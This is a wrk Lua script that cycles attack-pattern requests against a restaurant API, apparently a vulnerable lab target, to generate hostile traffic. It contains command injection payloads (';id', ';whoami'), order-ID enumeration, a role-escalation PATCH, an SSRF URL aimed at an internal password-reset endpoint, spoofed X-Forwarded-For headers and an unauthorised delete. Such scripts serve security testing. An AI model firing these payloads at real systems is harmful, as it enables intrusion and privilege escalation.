-- wrk Lua: Restaurant API attack patterns over persistent connections
-- Cycles through BOLA, BFLA, SSRF, discovery, and injection endpoints

local counter = 0
local marker = assert(os.getenv("TGEN_FAMILY_MARKER"), "family journal marker required")

local requests_list = {
  { method = "GET",  path = "/restaurant/menu" },
  { method = "GET",  path = "/restaurant/docs" },
  { method = "GET",  path = "/restaurant/openapi.json" },
  { method = "GET",  path = "/restaurant/orders/1" },
  { method = "GET",  path = "/restaurant/orders/2" },
  { method = "GET",  path = "/restaurant/orders/3" },
  { method = "GET",  path = "/restaurant/orders/4" },
  { method = "GET",  path = "/restaurant/orders/5" },
  { method = "GET",  path = "/restaurant/profile" },
  { method = "GET",  path = "/restaurant/discount-coupons" },
  { method = "GET",  path = "/restaurant/admin/stats/disk?parameters=;id" },
  { method = "GET",  path = "/restaurant/admin/stats/disk?parameters=;whoami" },
  { method = "GET",  path = "/restaurant/users" },
  { method = "GET",  path = "/restaurant/redoc" },
  { method = "POST", path = "/restaurant/register", body = '{"username":"' .. marker .. '-register","password":"Torture123","first_name":"T","last_name":"T","phone_number":"555' .. math.random(1000000, 9999999) .. '"}' },
  { method = "POST", path = "/restaurant/token", body = "username=attacker&password=Attack123", content_type = "application/x-www-form-urlencoded" },
  { method = "PUT",  path = "/restaurant/profile", body = '{"username":"chef","phone_number":"bola-test"}' },
  { method = "PATCH", path = "/restaurant/profile", body = '{"role":"Chef"}' },
  { method = "PUT",  path = "/restaurant/menu", body = '{"name":"SSRF","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}' },
  { method = "DELETE", path = "/restaurant/menu/1" },
}

request = function()
  counter = counter + 1
  local req = requests_list[(counter % #requests_list) + 1]

  wrk.headers["Connection"] = "keep-alive"
  wrk.headers["Content-Type"] = req.content_type or "application/json"
  wrk.headers["X-Forwarded-For"] = "198.51.100." .. math.random(0, 255)

  if req.body then
    return wrk.format(req.method, req.path, nil, req.body)
  else
    return wrk.format(req.method, req.path)
  end
end
